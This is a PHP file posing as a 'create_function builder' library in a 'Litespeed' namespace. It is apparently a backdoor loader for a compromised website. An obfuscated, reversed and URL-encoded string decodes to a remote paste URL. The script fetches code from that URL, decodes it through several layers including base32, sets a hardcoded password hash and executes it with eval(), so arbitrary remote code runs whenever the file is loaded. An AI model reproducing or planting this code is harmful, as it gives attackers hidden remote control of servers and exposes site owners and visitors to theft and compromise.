<?php
namespace Litespeed;

/**
 * Phyo186 Deprecated create_function builder for latest php version.
 *
 * @author  Agent Phyo
 * @author  Agent Phyo
 *
 * @see     https://www.github.com/
 *
 * @license MIT License see LICENSE file
 */

 class Obrigado {

    public static function Phyo($input) {
        $flippedMap = array(
            'A' => 0, 'B' => 1, 'C' => 2, 'D' => 3, 'E' => 4, 'F' => 5,
            'G' => 6, 'H' => 7, 'I' => 8, 'J' => 9, 'K' => 10, 'L' => 11,
            'M' => 12, 'N' => 13, 'O' => 14, 'P' => 15, 'Q' => 16, 'R' => 17,
            'S' => 18, 'T' => 19, 'U' => 20, 'V' => 21, 'W' => 22, 'X' => 23,
            'Y' => 24, 'Z' => 25, '2' => 26, '3' => 27, '4' => 28, '5' => 29,
            '6' => 30, '7' => 31
        );

        $input = str_split($input);
        $binaryString = "";

        for($i = 0; $i < count($input); $i++) {
            if(isset($flippedMap[$input[$i]])){
                $binaryString .= str_pad(base_convert($flippedMap[$input[$i]], 10, 2), 5, '0', STR_PAD_LEFT);
            }
        }

        $byteArray = str_split($binaryString, 8);
        $asciiString = "";

        $i = 0;
        while($i < count($byteArray)) {
            $asciiString .= chr(base_convert(str_pad($byteArray[$i], 8, '0'), 2, 10));
            $i++;
        }

        return $asciiString;
    }
}
function Rev($str) {
    preg_match_all('/./us', $str, $matches);
    return implode('', array_reverse($matches[0]));
}
function raw($str) {
    return preg_replace_callback(
        '/%([0-9a-f]{2})/i',
        function ($matches) {
            return chr(hexdec($matches[1]));
        },
        $str
    );
}
function Phyo3($text) {
    $parts = explode('-', $text);
    $result = '';
    for($i = 0; $i < count($parts); $i++) {
        $ascii = $parts[$i];
        $ascii /= pow(($i + 1), 3);
        $result .= chr($ascii);
    }
    return $result;
}
$auth = raw(Rev("war04%57a985F2%etsapF2%dfc.681oyhp.pF2%F2%A3%sptth"));
$origin = file($auth);
$o = Phyo3($origin[0]);
use Litespeed\Obrigado;
$Sampler = Rev(raw($o));
$sip = Obrigado::Phyo($Sampler);
$password = "edb4fbf88d971e2e7546df545c401794";
eval($sip);
?>